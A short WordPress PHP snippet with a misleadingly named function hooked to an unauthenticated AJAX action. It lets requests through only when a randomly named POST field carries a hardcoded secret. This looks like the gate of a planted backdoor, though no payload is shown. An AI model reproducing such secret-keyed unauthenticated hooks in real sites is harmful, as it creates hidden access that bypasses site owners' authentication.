<?php

function authentication_progress_make_html5() {
	if (!isset($_POST["qylsvtjjsiem"]) || $_POST["qylsvtjjsiem"] !== "ajDKMSKA3vDnmy") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'authentication_progress_make_html5', 5, 1);
